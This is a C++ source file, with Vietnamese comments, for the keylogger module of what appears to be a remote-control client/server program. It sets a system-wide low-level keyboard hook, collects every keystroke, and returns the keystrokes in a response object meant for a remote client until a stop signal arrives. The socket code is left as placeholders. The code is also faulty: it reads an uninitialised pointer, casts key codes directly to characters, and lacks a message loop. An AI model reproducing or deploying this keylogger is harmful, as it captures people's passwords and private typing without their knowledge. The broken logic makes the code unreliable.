#include "KLG_Func.h"
#include "utils.h"

LRESULT KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode < 0) { // Bỏ qua các thông điệp khác nếu nCode < 0
		return CallNextHookEx(NULL, nCode, wParam, lParam);
	}
	
	// Lấy thông tin về sự kiện phím
	KBDLLHOOKSTRUCT* pkbhs = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);

	if (wParam == WM_KEYDOWN)
	{
		// Nếu là sự kiện nhấn phím, lưu phím vào biến tạm
		keylog.push_back(pkbhs->vkCode);
	}

	// Gọi hàm xử lý sự kiện tiếp theo trong chuỗi xử lý
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

DataObj* KLG_Func::keylogger()
{
    std::string res = "";
    DataObj* MES = new DataObj(utils::CurrentTime(), DataType::RESPONSE, FuncType::KLG, CmdType::DATA, res);

	// Thiết lập hook để bắt sự kiện phím
	HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
	// Nếu không thiết lập hook thành công, báo lỗi và thoát chương trình
	if (!hook)
	{
		std::cout << "Error setting keyboard hook: " << GetLastError() << std::endl;
		
		// Đóng socket và giải phóng thư viện Winsock
		// ...
        
		res = "Hook failed.";
	}
    else
    {
        while (!checkStopSignal())
        {
            // Nếu đã bắt được ít nhất một phím, gửi danh sách các phím đã bắt được đến client
            if (!keylog.empty())
            {
                // Ghép các phím đã bắt được thành một chuỗi
                for (auto key : keylog)
                {
                    res += (char(key));
                }

                // Xóa danh sách các phím đã bắt được
                keylog.clear();
            }

            // Chờ 1 giây trước khi kiểm tra lại
            Sleep(1000);
        }

        // Huỷ hook
        UnhookWindowsHookEx(hook);
    }

    MES->setData(res);
	
	return MES;
}


bool KLG_Func::checkStopSignal()
{
	DataObj* stopSignal;

	// thao tác nhận tín hiệu từ client là đối tượng DataObj stopSignal
	// ...


	if (stopSignal->getFuncType() == KLG && stopSignal->getCmdType() == STOP)
	{
		// gửi thông điệp đã nhận được tín hiệu cho client 
		// ...
		//closesocket(ClientSocket);
		//closesocket(ListenSocket);
		//WSACleanup();
		return true;
	}
	return false;
}